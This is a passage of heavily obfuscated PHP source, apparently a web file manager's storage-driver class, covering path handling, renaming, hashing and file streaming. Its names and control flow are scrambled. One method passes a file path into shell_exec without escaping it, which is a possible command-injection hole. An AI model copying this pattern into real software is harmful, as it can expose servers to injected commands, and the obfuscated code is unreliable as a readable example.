““•šĞ); } goto Dä¶©îÊáÁ; aëÔ†ÖÒ†È: $eŸÓÈ‰ÏÛŞ[$c‹ÖƒÚ‰¸¢ . $eÌùÜé†˜[78] . $c«­æ­Æ—³ . $eÌùÜé†˜[79] . $b ““•šĞ] = $b ““•šĞ; $eŸÓÈ‰ÏÛŞ[$c‹ÖƒÚ‰¸¢ . $eÌùÜé†˜[78] . $c«­æ­Æ—³ . $eÌùÜé†˜[79] . $a¨«ó¨­] = $b ““•šĞ; $eŸÓÈ‰ÏÛŞ[$c«­æ­Æ—³ . $eÌùÜé†˜[78] . $c‹ÖƒÚ‰¸¢ . $eÌùÜé†˜[79] . $a¨«ó¨­] = $a¨«ó¨­; goto FÌƒÊ†Ü¬…; A‹ª”µ¶å°: } public function getPathInner($bœæè÷…›Á) { $eŒÜ´·¡¯Ü = IO::init($bœæè÷…›Á); return $eŒÜ´·¡¯Ü->path; } public function getPathOuter($e‰Æì’¤ğÍ) { $C‰å¼‹çÂ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bô´ÒŸ»Üã = strlen(trim($this->pathBase, $C‰å¼‹çÂ[18])); $e‰Æì’¤ğÍ = substr(trim($e‰Æì’¤ğÍ, $C‰å¼‹çÂ[18]), $Bô´ÒŸ»Üã); return $this->pathDriver . $C‰å¼‹çÂ[18] . ltrim($e‰Æì’¤ğÍ, $C‰å¼‹çÂ[18]); } public function isParentOf($E÷„‚³í¸ë, $Eá™å•¸„„) { $a©†ìá¯‘Ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $E÷„‚³í¸ë = rtrim(strtolower($E÷„‚³í¸ë), $a©†ìá¯‘Ï[18]) . $a©†ìá¯‘Ï[18]; $Eá™å•¸„„ = rtrim(strtolower($Eá™å•¸„„), $a©†ìá¯‘Ï[18]) . $a©†ìá¯‘Ï[18]; $fô×“ˆØñÊ = strpos($Eá™å•¸„„, $E÷„‚³í¸ë) === 0; return $fô×“ˆØñÊ; } public function getType() { $b›öíøÜÎĞ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eåŠ³õ±ñæ = str_replace($b›öíøÜÎĞ[83], $b›öíøÜÎĞ[43], get_class($this)); return strtolower($eåŠ³õ±ñæ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($CÜ ÂÇ…ï, $A‹²’ğ¿×) { $AÑÈõ÷¯¬† =& $_SERVER[¹÷ˆ§éÒ°ú]; $dŠäÓˆ¾õ‹ = rtrim($CÜ ÂÇ…ï, $AÑÈõ÷¯¬†[18]) . $AÑÈõ÷¯¬†[18] . $A‹²’ğ¿×; $Eá°çØÇŸƒ = $this->exist($dŠäÓˆ¾õ‹); return $Eá°çØÇŸƒ ? $dŠäÓˆ¾õ‹ : !1; } public function setModifyTime($BöŸ˜Œß»Ô, $f´æ°æ¼ó = '') { } public function renameObject($D±ø¬–Ê•ó, $A¯—Õ‡ç¿) { goto c‚†Ÿ¢œ±; c‚†Ÿ¢œ±: $a›®Æî† =& $_SERVER[¹÷ˆ§éÒ°ú]; $D„È°ÁÃ„ = $A¯—Õ‡ç¿; Hook::trigger($a›®Æî†[84], $this, $D±ø¬–Ê•ó, $this, $this->pathFather($D±ø¬–Ê•ó) . $A¯—Õ‡ç¿); goto bš»Íƒ¹’§; bš»Íƒ¹’§: $D±ø¬–Ê•ó = $this->getPathOuter($D±ø¬–Ê•ó); $A¯—Õ‡ç¿ = $this->pathFather($D±ø¬–Ê•ó) . $A¯—Õ‡ç¿; if (IO::isFile($D±ø¬–Ê•ó)) { $fÛÕ´½•øÕ = IO::copy($D±ø¬–Ê•ó, $this->pathFather($D±ø¬–Ê•ó), REPEAT_RENAME_FOLDER, $D„È°ÁÃ„); if ($fÛÕ´½•øÕ) { IO::remove($D±ø¬–Ê•ó); } } else { $fÛÕ´½•øÕ = IO::mkdir($A¯—Õ‡ç¿); if (!$fÛÕ´½•øÕ) { return !1; } $AáìµÓ„˜ = IO::listPath($D±ø¬–Ê•ó, !0); $a¯Æ ÈŸğĞ = array_merge($AáìµÓ„˜[$a›®Æî†[85]], $AáìµÓ„˜[$a›®Æî†[86]]); foreach ($a¯Æ ÈŸğĞ as $cœ©ŠÇ¿Ùƒ) { IO::move($cœ©ŠÇ¿Ùƒ[$a›®Æî†[87]], $A¯—Õ‡ç¿, REPEAT_RENAME_FOLDER); } IO::remove($D±ø¬–Ê•ó); } goto B‚ê¢ªø„„; B‚ê¢ªø„„: return $fÛÕ´½•øÕ ? $A¯—Õ‡ç¿ : !1; goto c°±¤Ø©ô; c°±¤Ø©ô: } public function tempFile($aºîç¤š = '', $F÷¿É‡­İ = '') { goto fÑ¬§«¿â’; dŞ®–Ç†²Ù: return $CµäÚªì÷É; goto dæÙ‰ó¦¾ï; fÑ¬§«¿â’: if (!$aºîç¤š) { $aºîç¤š = rand_string(15); } $Cµ³´’Ø = TEMP_FILES . rand_string(15) . $_SERVER[¹÷ˆ§éÒ°ú][18]; @mkdir($Cµ³´’Ø, 511, !0); goto fÒì”¿ÈÌ; fÒì”¿ÈÌ: $CµäÚªì÷É = $Cµ³´’Ø . $aºîç¤š; @touch($CµäÚªì÷É); if ($F÷¿É‡­İ) { file_put_contents($CµäÚªì÷É, $F÷¿É‡­İ); } goto dŞ®–Ç†²Ù; dæÙ‰ó¦¾ï: } public function tempFileRemve($f¤Ü…àÌÇ×) { @unlink($f¤Ü…àÌÇ×); @rmdir($this->pathFather($f¤Ü…àÌÇ×)); } public function mkfile($a†¥ŸëÕ¥, $d–ÂœäÇ¯ = '', $A…Ë”‘±¸‰ = REPEAT_RENAME) { } public function mkdir($Cí¾ÁÍ¥¶, $CË·İ®ç„Õ = REPEAT_SKIP) { } public function delFile($C «‚»“™ ) { } public function delFolder($fğİ‡ôß¡) { } public function copyFile($C·ŒÆ˜£, $bïŒŞ‰µ‘½) { } public function moveFile($Fø¡Ò¨µ‡Ñ, $C®¾‚Ç¯ñ¦) { } public function remove($c˜ÔÀƒ˜ƒ½) { if ($this->isFile($c˜ÔÀƒ˜ƒ½)) { return $this->delFile($c˜ÔÀƒ˜ƒ½); } return $this->delFolder($c˜ÔÀƒ˜ƒ½); } public function rename($c¤–öÒÇŸË, $A°˜…‚Ê) { } public function exist($fÎôÒçÀ—) { } public function findByHash($d™–ÓËÃ¨ = '', $eø×¸”Œç÷ = '') { return !1; } public function isFile($bŠÚ­·ÚÃ) { } public function isFolder($cÙÍƒ¬™ìº) { } public function size($CÈ£ößå) { } public function info($e¾ğç‘›ôã) { } public function infoSimple($F–ñÆã›«·) { return $this->info($F–ñÆã›«·); } public function infoAuth($E²µ´ÇàŒ ) { return $this->info($E²µ´ÇàŒ ); } public function infoFull($bÌ¿ŒŒÌâ) { return $this->info($bÌ¿ŒŒÌâ); } public function infoWithChildren($f˜õ›¬ç¶Ë) { $BÃ­­•Æç =& $_SERVER[¹÷ˆ§éÒ°ú]; static $D×Ö„§Âíè = array(); if (isset($D×Ö„§Âíè[$f˜õ›¬ç¶Ë])) { return $D×Ö„§Âíè[$f˜õ›¬ç¶Ë]; } $E’İø“šÙ = $this->info($f˜õ›¬ç¶Ë); if ($E’İø“šÙ && $E’İø“šÙ[$BÃ­­•Æç[39]] == $BÃ­­•Æç[88]) { $C•®‡Ã™… = array($BÃ­­•Æç[89] => 0, $BÃ­­•Æç[90] => 0, $BÃ­­•Æç[91] => 0); $this->infoChildren($f˜õ›¬ç¶Ë, $C•®‡Ã™…); $E’İø“šÙ[$BÃ­­•Æç[89]] = $C•®‡Ã™…[$BÃ­­•Æç[89]]; $E’İø“šÙ[$BÃ­­•Æç[92]] = array($BÃ­­•Æç[93] => $C•®‡Ã™…[$BÃ­­•Æç[90]], $BÃ­­•Æç[94] => $C•®‡Ã™…[$BÃ­­•Æç[91]]); $D×Ö„§Âíè[$f˜õ›¬ç¶Ë] = $E’İø“šÙ; } return $E’İø“šÙ; } public function listPath($cÜ´ˆ›ÉÖÅ, $C¸ÉÊ÷ä’Š = false) { } public function has($B†ì†˜Œä´, $E’êêÅ—ìİ = false, $c™°¶Âíñ‘ = false) { } public function canRead($cÓš†·Ë™å) { } public function canWrite($B˜„œ…Û¼±) { } public function getContent($Aé¹¯ğ˜Ú) { } public function setContent($e‰ğÑáÆ‹, $dÔâ«›À™Ê = '') { } protected function infoChildren($f¦Ñ»Š‡´—, &$c¹¤–Ò´¤) { $eÃ²—‰Ä´« =& $_SERVER[¹÷ˆ§éÒ°ú]; check_abort(); $eÒ¨……Ïè = $this->listPath($f¦Ñ»Š‡´—, !0); $eÒ¨……Ïè = array_merge($eÒ¨……Ïè[$eÃ²—‰Ä´«[86]], $eÒ¨……Ïè[$eÃ²—‰Ä´«[85]]); foreach ($eÒ¨……Ïè as $D©°Ü¶°Ôè) { if ($D©°Ü¶°Ôè[$eÃ²—‰Ä´«[39]] == $eÃ²—‰Ä´«[88]) { $c¹¤–Ò´¤[$eÃ²—‰Ä´«[91]]++; $AÆ†˜ÅŒ²ì = $this->getPathInner($D©°Ü¶°Ôè[$eÃ²—‰Ä´«[87]]); $this->infoChildren($AÆ†˜ÅŒ²ì, $c¹¤–Ò´¤); } else { $c¹¤–Ò´¤[$eÃ²—‰Ä´«[90]]++; $c¹¤–Ò´¤[$eÃ²—‰Ä´«[89]] += $D©°Ü¶°Ôè[$eÃ²—‰Ä´«[89]]; } } } public function fileSubstr($aÄé‰†ÀÄ, $a›¥à‚¬ç«, $dÒ¬«ÕâËÑ) { } public function listAll($FÂÔÂ‡ö¸Ú) { } public function upload($fôĞšÙß, $C¦„„ùÒÛ, $CµŸ›Ê´à = false, $d‡‚¼‹‘˜Ú = REPEAT_REPLACE) { } public function uploadFileByID($FÖ¡èˆ†ï, $D‚æ“ïõŠŞ, $aƒ¤Éš³»Ó) { } public function uploadFileByPath($fß§Ğ“–º, $d±‹¿äĞğ, $eÎ¹ñ¡Ğ‘ = array()) { } public function isUploadServer() { $bâàŒ‘÷ô¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $bâàŒ‘÷ô¸[95]) { return !0; } return $GLOBALS[$bâàŒ‘÷ô¸[16]][$bâàŒ‘÷ô¸[96]][$bâàŒ‘÷ô¸[97]]; } public function isFileOutServer() { $c§ò‰Á…ßÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $c§ò‰Á…ßÃ[95]) { return !0; } return $GLOBALS[$c§ò‰Á…ßÃ[16]][$c§ò‰Á…ßÃ[96]][$c§ò‰Á…ßÃ[98]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Dí¼–‡ë¢…) { $CÊ‘×ÇŠÊ¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->isCdnHost()) { return $Dí¼–‡ë¢…; } return str_replace(trim(get_url_root($Dí¼–‡ë¢…), $CÊ‘×ÇŠÊ¥[18]), trim($this->cdnHost, $CÊ‘×ÇŠÊ¥[18]), $Dí¼–‡ë¢…); } public function uploadLink($Eäô¬…–ì”, $D—ñó•Íó = 0) { goto B°Î«‚ôé; C™ÌÊ°êÄÖ: if ($F‡˜®ÌÆğ÷) { $F‡˜®ÌÆğ÷[$D¼‚‹·[101]] = $Eäô¬…–ì”; $F‡˜®ÌÆğ÷[$D¼‚‹·[102]] = $bå˜Ü àŠ; } return $F‡˜®ÌÆğ÷; goto Dé×èÚ­ƒ; Bñ§™ ‰Õ¤: $BÓ™ƒ•ŠŞ¬ = $D—ñó•Íó <= $c Š’ìİ ? $D¼‚‹·[99] : $D¼‚‹·[100]; $cËª‹“… = (!$D—ñó•Íó ? 1 : ceil($D—ñó•Íó / pow(1024, 3))) * 3600 * 4; $F‡˜®ÌÆğ÷ = $this->{$BÓ™ƒ•ŠŞ¬}($Eäô¬…–ì”, $cËª‹“…); goto C™ÌÊ°êÄÖ; B°Î«‚ôé: $D¼‚‹· =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->isUploadServer()) { return; } $bå˜Ü àŠ = $this->getType(); goto aíèÇÜÇ¢‰; aíèÇÜÇ¢‰: if (!in_array($bå˜Ü àŠ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $c Š’ìİ = 1024 * 1024 * 10; goto Bñ§™ ‰Õ¤; Dé×èÚ­ƒ: } public function uploadFormData($eÑ®Ü™‚ãÌ, $eã­­Åµ™’ = 3600) { } public function multiUploadFormData($Cğ™ìì‡¨, $c™ç‘õâ½³ = 3600) { } public function download($DñËÓ®Ä¬, $Fğ¶ÄÉÂèÌ) { } public function ext($A™”…ßÜä) { $dÍßŸ¹èô¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (strpos($A™”…ßÜä, $dÍßŸ¹èô¥[18]) === -1) { $D¤‘£‹©¢í = $A™”…ßÜä; } else { $D¤‘£‹©¢í = $this->pathThis($A™”…ßÜä); } $c™±ö¹øŸ‡ = $dÍßŸ¹èô¥[43]; if (strstr($D¤‘£‹©¢í, $dÍßŸ¹èô¥[103])) { $c™±ö¹øŸ‡ = substr($D¤‘£‹©¢í, strrpos($D¤‘£‹©¢í, $dÍßŸ¹èô¥[103]) + 1); $c™±ö¹øŸ‡ = strtolower($c™±ö¹øŸ‡); } if (strlen($c™±ö¹øŸ‡) > 3 && preg_match($dÍßŸ¹èô¥[104], $c™±ö¹øŸ‡, $C§ùè§ä“¢)) { $c™±ö¹øŸ‡ = $dÍßŸ¹èô¥[43]; } return $c™±ö¹øŸ‡; } public function pathThis($FÀµĞÃæŒ¯) { $FëêçÁòåš =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÀµĞÃæŒ¯ = str_replace($FëêçÁòåš[105], $FëêçÁòåš[18], rtrim($FÀµĞÃæŒ¯, $FëêçÁòåš[18])); $dö‹ÙÇ³áÀ = strrpos($FÀµĞÃæŒ¯, $FëêçÁòåš[18]); if ($dö‹ÙÇ³áÀ === !1) { return $FÀµĞÃæŒ¯; } return substr($FÀµĞÃæŒ¯, $dö‹ÙÇ³áÀ + 1); } public function pathFather($c‚„™ÙèØ) { $dê‚Õ‹”ä =& $_SERVER[¹÷ˆ§éÒ°ú]; $c‚„™ÙèØ = str_replace($dê‚Õ‹”ä[105], $dê‚Õ‹”ä[18], rtrim($c‚„™ÙèØ, $dê‚Õ‹”ä[18])); $CŒµé™ÍÖ³ = strrpos($c‚„™ÙèØ, $dê‚Õ‹”ä[18]); if ($CŒµé™ÍÖ³ === !1) { return $dê‚Õ‹”ä[43]; } return substr($c‚„™ÙèØ, 0, $CŒµé™ÍÖ³ + 1); } public function hashSimple($A´ÛÚ„ô¢Ÿ) { goto f¬óéìé¼; B‰§ï£šä´: $BÈÊ”“¦¸ì = 200; $BæË£ùˆê‰ = 50; if ($AöÆµ„‹ßƒ <= $BÈÊ”“¦¸ì * $BæË£ùˆê‰) { return $this->hashMd5($A´ÛÚ„ô¢Ÿ) . $AöÆµ„‹ßƒ; } goto cõİŠóÔ˜Ÿ; cõİŠóÔ˜Ÿ: $eİÛÏ’ˆˆ = intval($AöÆµ„‹ßƒ / $BæË£ùˆê‰); $eÊ‘íÓñÈ = $BëÈ²Â×¥µ[43]; for ($dÃÏ‘®ÚÄ— = 0; $dÃÏ‘®ÚÄ— < $BæË£ùˆê‰; $dÃÏ‘®ÚÄ—++) { $eÊ‘íÓñÈ .= $this->fileSubstr($A´ÛÚ„ô¢Ÿ, $eİÛÏ’ˆˆ * $dÃÏ‘®ÚÄ—, $BÈÊ”“¦¸ì); } goto Aƒ£‡©Ú©Ô; Aƒ£‡©Ú©Ô: $eÊ‘íÓñÈ .= $this->fileSubstr($A´ÛÚ„ô¢Ÿ, $AöÆµ„‹ßƒ - $BÈÊ”“¦¸ì, $BÈÊ”“¦¸ì); return md5($eÊ‘íÓñÈ) . $AöÆµ„‹ßƒ; goto E›á®šòÀ; f¬óéìé¼: $BëÈ²Â×¥µ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$A´ÛÚ„ô¢Ÿ) { return md5($BëÈ²Â×¥µ[43]); } $AöÆµ„‹ßƒ = $this->size($A´ÛÚ„ô¢Ÿ); goto B‰§ï£šä´; E›á®šòÀ: } public static $md5Cache = array(); public function hashMd5($bêñ¶ìÇëñ) { $bêñ¶ìÇëñ = $this->iconvSystem($bêñ¶ìÇëñ); if (isset(self::$md5Cache[$bêñ¶ìÇëñ])) { return self::$md5Cache[$bêñ¶ìÇëñ]; } self::$md5Cache[$bêñ¶ìÇëñ] = $this->hashMd5Shell($bêñ¶ìÇëñ); if (!self::$md5Cache[$bêñ¶ìÇëñ]) { self::$md5Cache[$bêñ¶ìÇëñ] = @md5_file($bêñ¶ìÇëñ); } return self::$md5Cache[$bêñ¶ìÇëñ]; } private function hashMd5Shell($c¢‘ùƒŒ) { goto aöìÏ­œ; EØÇßÅõ: $aìÂì¯…é‰ = Cache::get($D’Â¼Ê §¤[109]); if (!$aìÂì¯…é‰) { $c••Ò˜šéô = BASIC_PATH . $D’Â¼Ê §¤[110]; $añïŒ²¸Ìê = md5_file($c••Ò˜šéô); $aìÂì¯…é‰ = $D’Â¼Ê §¤[111]; foreach ($F¶Öİã ‡¨ as $aÑ¹°´åƒõ) { $a¶â­ÃÙÀ‰ = shell_exec($aÑ¹°´åƒõ . "\40\x22{$c••Ò˜šéô}\42"); if ($a¶â­ÃÙÀ‰ && substr(trim($a¶â­ÃÙÀ‰), 0, 32) == $añïŒ²¸Ìê) { $aìÂì¯…é‰ = $aÑ¹°´åƒõ; break; } } Cache::set($D’Â¼Ê §¤[109], $aìÂì¯…é‰, 3600); } if ($aìÂì¯…é‰ == $D’Â¼Ê §¤[111]) { return !1; } goto EÜÆ’¸×‚ì; EÜÆ’¸×‚ì: $a¶â­ÃÙÀ‰ = shell_exec($aìÂì¯…é‰ . "\x20\x22{$c¢‘ùƒŒ}\x22"); $a¶â­ÃÙÀ‰ = str_replace($D’Â¼Ê §¤[112], $D’Â¼Ê §¤[43], $a¶â­ÃÙÀ‰); return substr($a¶â­ÃÙÀ‰, 0, 32); goto e¥ÖÛğ¨‹í; aöìÏ­œ: $D’Â¼Ê §¤ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!function_exists($D’Â¼Ê §¤[106])) { return !1; } $F¶Öİã ‡¨ = array($D’Â¼Ê §¤[107], $D’Â¼Ê §¤[108]); goto EØÇßÅõ; e¥ÖÛğ¨‹í: } public function link($fğ‘Â¥˜Ä) { return $fğ‘Â¥˜Ä; } public function fileOut($a™‚–£¹å®, $BÇøÕ›ƒ‡ = false, $A¿´µÑí‚ = false, $Cİè¼‹…•æ = '') { goto b¹öˆÁ’ô; c¹Ÿš•»Ê: if ($AØ£ÂŞÉĞÎ) { $cğÒ’ªÈ = intval(1000 * 1000 * ($E•àó„–ˆ / $AØ£ÂŞÉĞÎ)); } while ($Cæùã¥Œ— <= $bœ¹©œñ) { $aÏ¹µô‡ƒ¥ = timeFloat(); check_abort(); $f‚¨áˆ«« = $bœ¹©œñ - $Cæùã¥Œ— + 1; if ($f‚¨áˆ«« <= $E•àó„–ˆ) { $E•àó„–ˆ = $f‚¨áˆ««; } echo $this->fileSubstr($a™‚–£¹å®, $Cæùã¥Œ—, $E•àó„–ˆ); $Cæùã¥Œ— += $E•àó„–ˆ; if ($E•àó„–ˆ == $f‚¨áˆ««) { $Cæùã¥Œ— = $bœ¹©œñ + 1; } if ($cğÒ’ªÈ) { $b»ÊªÑâÚÚ = intval(1000 * 1000 * (timeFloat() - $aÏ¹µô‡ƒ¥)); $B³ö’ƒ‘°œ = $cğÒ’ªÈ - $b»ÊªÑâÚÚ; if ($B³ö’ƒ‘°œ > 5) { usleep($B³ö’ƒ‘°œ); } } } goto DÓÒ×šğË; aÙœÁ²†š: $D©àÔ””Ñ§ = rawurlencode($a²†âÏ²Ê); $D©àÔ””Ñ§ = $AÊàˆñ¤Ğß[125] . $D©àÔ””Ñ§ . $AÊàˆñ¤Ğß[129] . $D©àÔ””Ñ§; if ($BÇøÕ›ƒ‡) { header($AÊàˆñ¤Ğß[130]); header($AÊàˆñ¤Ğß[131] . $D©àÔ””Ñ§); } else { header($AÊàˆñ¤Ğß[132] . $D©àÔ””Ñ§); } goto EÆÛí…ÜŸ; bíè¿œ¸: if ($_SERVER[$AÊàˆñ¤Ğß[166]] == $AÊàˆñ¤Ğß[167]) { return; } $E•àó„–ˆ = 1024 * 100; $cğÒ’ªÈ = 0; goto c¹Ÿš•»Ê; AÊ¨‡“’’´: $CÒÃïÃÈâ = strtolower($_SERVER[$AÊàˆñ¤Ğß[151]]); if ($DÁÌğÊæå¡ && $CÒÃïÃÈâ && $d‰²×º¥Û) { if (strstr($CÒÃïÃÈâ, $AÊàˆñ¤Ğß[152])) { header($AÊàˆñ¤Ğß[153] . $a™‚–£¹å®); } else { if (strstr($CÒÃïÃÈâ, $AÊàˆñ¤Ğß[154])) { header($AÊàˆñ¤Ğß[155] . $a™‚–£¹å®); } else { if (strstr($CÒÃïÃÈâ, $AÊàˆñ¤Ğß[156])) { header($AÊàˆñ¤Ğß[157] . $a™‚–£¹å®); } } } if ($AØ£ÂŞÉĞÎ) { header($AÊàˆñ¤Ğß[158] . $AØ£ÂŞÉĞÎ); } return; } if (isset($_SERVER[$AÊàˆñ¤Ğß[159]])) { if (preg_match($AÊàˆñ¤Ğß[160], $_SERVER[$AÊàˆñ¤Ğß[159]], $e¨é±éÈ¯)) { $Cæùã¥Œ— = intval($e¨é±éÈ¯[1]); if (!empty($e¨é±éÈ¯[2])) { $bœ¹©œñ = intval($e¨é±éÈ¯[2]); } } header($AÊàˆñ¤Ğß[161]); header("\103\x6f\156\x74\145\x6e\x74\55\x52\x61\156\x67\x65\x3a\x20\x62\171\x74\145\163\40{$Cæùã¥Œ—}\55{$bœ¹©œñ}\x2f" . $fÒ•ğÂÊÈ); } else { header($AÊàˆñ¤Ğß[162]); } goto d‘¾•ƒñîÈ; D¾§¾±Çè: $aÁ–‘Ù®Ñ° = get_file_mime($BÇ—Ã²¨Å‡); if (strstr($aÁ–‘Ù®Ñ°, $AÊàˆñ¤Ğß[126])) { $aÁ–‘Ù®Ñ° = $aÁ–‘Ù®Ñ° . $AÊàˆñ¤Ğß[127]; } if ($BÇøÕ›ƒ‡ === !1 && !mime_support($aÁ–‘Ù®Ñ°)) { $BÇøÕ›ƒ‡ = !0; $aÁ–‘Ù®Ñ° = $AÊàˆñ¤Ğß[128]; } goto aÙœÁ²†š; b´µ§‘Ë¥Ò: $fÒ•ğÂÊÈ = $E¬¨¨Ï¯²Î[$AÊàˆñ¤Ğß[89]]; $F–—ÓÒ°ˆ³ = gmdate($AÊàˆñ¤Ğß[118], $E¬¨¨Ï¯²Î[$AÊàˆñ¤Ğß[119]]); $a²†âÏ²Ê = $A¿´µÑí‚ ? $A¿´µÑí‚ : $this->iconvApp($E¬¨¨Ï¯²Î[$AÊàˆñ¤Ğß[38]]); goto Cò¨…õ­ßÍ; EÔØò¬ÉèŸ: @ob_end_clean(); set_timeout(); $E¬¨¨Ï¯²Î = $this->infoFull($a™‚–£¹å®); goto b´µ§‘Ë¥Ò; Cò¨…õ­ßÍ: $Cæùã¥Œ— = 0; $bœ¹©œñ = $fÒ•ğÂÊÈ - 1; $BÇ—Ã²¨Å‡ = $this->ext($a²†âÏ²Ê); goto Fî½Íˆ¯’Œ; Fî½Íˆ¯’Œ: if (in_array($BÇ—Ã²¨Å‡, array($AÊàˆñ¤Ğß[120], $AÊàˆñ¤Ğß[121], $AÊàˆñ¤Ğß[122], $AÊàˆñ¤Ğß[123]))) { $BÇ—Ã²¨Å‡ = $AÊàˆñ¤Ğß[124]; } if (!$Cİè¼‹…•æ) { $Cİè¼‹…•æ = md5($F–—ÓÒ°ˆ³ . $this->hashSimple($a™‚–£¹å®)); } $Cİè¼‹…•æ = $AÊàˆñ¤Ğß[125] . $Cİè¼‹…•æ . $AÊàˆñ¤Ğß[125]; goto D¾§¾±Çè; EÆÛí…ÜŸ: header($AÊàˆñ¤Ğß[133]); header($AÊàˆñ¤Ğß[134] . $aÁ–‘Ù®Ñ°); header($AÊàˆñ¤Ğß[135] . gmdate($AÊàˆñ¤Ğß[118], time() + 3600 * 24 * 30) . $AÊàˆñ¤Ğß[136]); goto fõÓÛÎ©«Î; d‘¾•ƒñîÈ: $Dñ®ğ²«³½ = !0; if ($_SERVER[$AÊàˆñ¤Ğß[163]] == $AÊàˆñ¤Ğß[164] && $fÒ•ğÂÊÈ > 1204 * 1024 * 1024 * 2) { $Dñ®ğ²«³½ = !1; } if ($Dñ®ğ²«³½) { header($AÊàˆñ¤Ğß[165] . ($bœ¹©œñ - $Cæùã¥Œ— + 1)); } goto bíè¿œ¸; E³îƒ¶‡¬­: header($AÊàˆñ¤Ğß[144] . $F–—ÓÒ°ˆ³ . $AÊàˆñ¤Ğß[136]); header($AÊàˆñ¤Ğß[145] . $a²†âÏ²Ê); header($AÊàˆñ¤Ğß[146]); goto E­Àï†¡‰; f‚Ã…‚ª¥®: if (isset($_SERVER[$AÊàˆñ¤Ğß[140]]) && strtotime($_SERVER[$AÊàˆñ¤Ğß[140]]) == $E¬¨¨Ï¯²Î[$AÊàˆñ¤Ğß[119]]) { header($AÊàˆñ¤Ğß[141], !0, 304); die; } if (isset($_SERVER[$AÊàˆñ¤Ğß[142]]) && $_SERVER[$AÊàˆñ¤Ğß[142]] == $Cİè¼‹…•æ) { header($AÊàˆñ¤Ğß[143] . $Cİè¼‹…•æ, !0, 304); die; } header($AÊàˆñ¤Ğß[143] . $Cİè¼‹…•æ); goto E³îƒ¶‡¬­; b¹öˆÁ’ô: $AÊàˆñ¤Ğß =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->cacheMethod(null, null); if (!$a™‚–£¹å® || !$this->exist($a™‚–£¹å®)) { show_json(LNG($AÊàˆñ¤Ğß[113]), !1, $A¿´µÑí‚); } goto Fˆ¥Î¨õâÌ; Fˆ¥Î¨õâÌ: $DÁÌğÊæå¡ = $this->getType() == $AÊàˆñ¤Ğß[114]; $d‰²×º¥Û = $GLOBALS[$AÊàˆñ¤Ğß[16]][$AÊàˆñ¤Ğß[96]][$AÊàˆñ¤Ğß[115]][$AÊàˆñ¤Ğß[116]]; $AØ£ÂŞÉĞÎ = (double) $GLOBALS[$AÊàˆñ¤Ğß[16]][$AÊàˆñ¤Ğß[96]][$AÊàˆñ¤Ğß[115]][$AÊàˆñ¤Ğß[117]] * 1024 * 1024; goto EÔØò¬ÉèŸ; fõÓÛÎ©«Î: header($AÊàˆñ¤Ğß[137]); header($AÊàˆñ¤Ğß[138]); header($AÊàˆñ¤Ğß[139]); goto f‚Ã…‚ª¥®; E­Àï†¡‰: header($AÊàˆñ¤Ğß[147] . $fÒ•ğÂÊÈ); header($AÊàˆñ¤Ğß[148]); if (!$BÇøÕ›ƒ‡ && $BÇ—Ã²¨Å‡ == $AÊàˆñ¤Ğß[149]) { if ($fÒ•ğÂÊÈ > 1024 * 1024 * 5) { die; } $b«ÂŸ÷ÇÁ¬ = $this->getContent($a™‚–£¹å®); $b«ÂŸ÷ÇÁ¬ = Html::clearSVG($b«ÂŸ÷ÇÁ¬); header($AÊàˆñ¤Ğß[150] . $fÒ•ğÂÊÈ); echo $b«ÂŸ÷ÇÁ¬; die; } goto AÊ¨‡“’’´; DÓÒ×šğË: } public function fileOutServer($EÛºÈš—‡Ú, $e‘°§ÂŠÊ = false, $Bãó˜Ÿ„… = false, $D™‡ĞÕ…¸Å = '') { $this->fileOut($EÛºÈš—‡Ú, $e‘°§ÂŠÊ, $Bãó˜Ÿ„…, $D™‡ĞÕ…¸Å); } public function fileOutLink($F·¨ À†¢‘) { header($_SERVER[¹÷ˆ§éÒ°ú][168] . $F·¨ À†¢‘); die; } public function cacheMethod($cƒËáÁÍëê, $b©ŠÀÌ‹Õ) { goto C¶Ñã¼Ç; C‰áÅèÖ‹: $dÇÈ™íÔ¥Ä = isset($C“á¡ò¿ªÏ[$FººóÅÖã]) ? $C“á¡ò¿ªÏ[$FººóÅÖã] : null; if (!is_null($dÇÈ™íÔ¥Ä)) { return $dÇÈ™íÔ¥Ä; } $dÇÈ™íÔ¥Ä = $this->{$cƒËáÁÍëê}($b©ŠÀÌ‹Õ); goto Cí¨°«ÙŠÏ; EØ¥§²ˆ´†: $FººóÅÖã = $Dğ“‰·õ‘[169] . $cƒËáÁÍëê . $Dğ“‰·õ‘[170] . rtrim($fá°åø©¯, $Dğ“‰·õ‘[18]); if (is_null($cƒËáÁÍëê)) { $C“á¡ò¿ªÏ = array(); return; } if (is_null($b©ŠÀÌ‹Õ)) { unset($C“á¡ò¿ªÏ[$FººóÅÖã]); return; } goto C‰áÅèÖ‹; Cí¨°«ÙŠÏ: $C“á¡ò¿ªÏ[$FººóÅÖã] = $dÇÈ™íÔ¥Ä; return $dÇÈ™íÔ¥Ä; goto e°³–Ëï›‚; C¶Ñã¼Ç: $Dğ“‰·õ‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $C“á¡ò¿ªÏ = array(); $fá°åø©¯ = $b©ŠÀÌ‹Õ ? ltrim($this->getPathOuter($b©ŠÀÌ‹Õ), $Dğ“‰·õ‘[18]) : $b©ŠÀÌ‹Õ; goto EØ¥§²ˆ´†; e°³–Ëï›‚: } public function fileOutImage($EÎÎ¬–¥°, $AËÚÆôéË¤ = 250) { goto b— º˜í£²; Bæ—ïĞ½Œ¸: if (!($d¹ö‚ò® = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $a‡âî˜ù”ô[177]))) { $eáÌùÂ„¡Ô = 